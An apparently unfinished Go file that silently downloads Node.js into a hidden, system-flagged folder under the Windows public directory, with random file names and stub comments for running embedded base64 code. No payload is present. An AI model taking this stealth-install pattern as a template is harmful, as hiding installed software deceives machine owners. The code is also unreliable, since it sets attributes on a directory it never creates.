package main

import (
	"io"
	"net/http"
	"os"
	"syscall"

	"github.com/artdarek/go-unzip"
)

const (
	INSTALL_PATH_ENV_VARIABLE = "public"
	INSTALL_PATH_NAME = "nodejs"

	INSTALL_HIDDEN = true

	DATA = `` // node files zipped base64 file
)

func InitSolver() error {
	publicDir := os.Getenv(INSTALL_PATH_ENV_VARIABLE)
	publicDir += "\\" + INSTALL_PATH_NAME
	newSet, err := SetupDir(publicDir)
	if err != nil {
		return err
	}
	if newSet {
		if path, err := DownloadNodeZip(publicDir); err == nil {
			path, err = Unzip(path)
			if err != nil {
				return err
			}
			// extract base64
			// unzip src files
			// npm install
			// run npm start thread
		} else {
			return err
		}
	} else {
		return nil
	}
	return err
}

func DownloadNodeZip(publicDir string) (string, error) {
	resp, err := http.Get("https://nodejs.org/dist/v15.7.0/node-v15.7.0-win-x64.zip")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	zipFileName := RandomString(8) + ".zip"
	file, err := os.Create(publicDir + "\\" + zipFileName)
	if err != nil {
		return "", err
	}
	_, err = io.Copy(file, resp.Body)
	if err != nil {
		return "", err
	}
	return publicDir + "\\" + zipFileName, nil
}

func SetupDir(publicDir string) (bool, error) {
	if _, err := os.Stat(publicDir); err != nil {
		if os.IsNotExist(err) {
			cPublicDir, err := syscall.UTF16PtrFromString(publicDir)
			if err != nil {
				return false, err
			}
			err = syscall.SetFileAttributes(cPublicDir, syscall.FILE_ATTRIBUTE_SYSTEM|syscall.FILE_ATTRIBUTE_HIDDEN)
			if err != nil {
				return false, err
			}
			return true, nil
		}
	}
	return false, nil
}

func Unzip(zipPath string) (string, error) {
	pathName := os.Getenv(INSTALL_PATH_ENV_VARIABLE) + "\\" + INSTALL_PATH_NAME + "\\" + RandomString(8) + "\\"
	uz := unzip.New(zipPath, pathName)
	err := uz.Extract()
	if err != nil {
		return "", err
	}
	return pathName, nil
}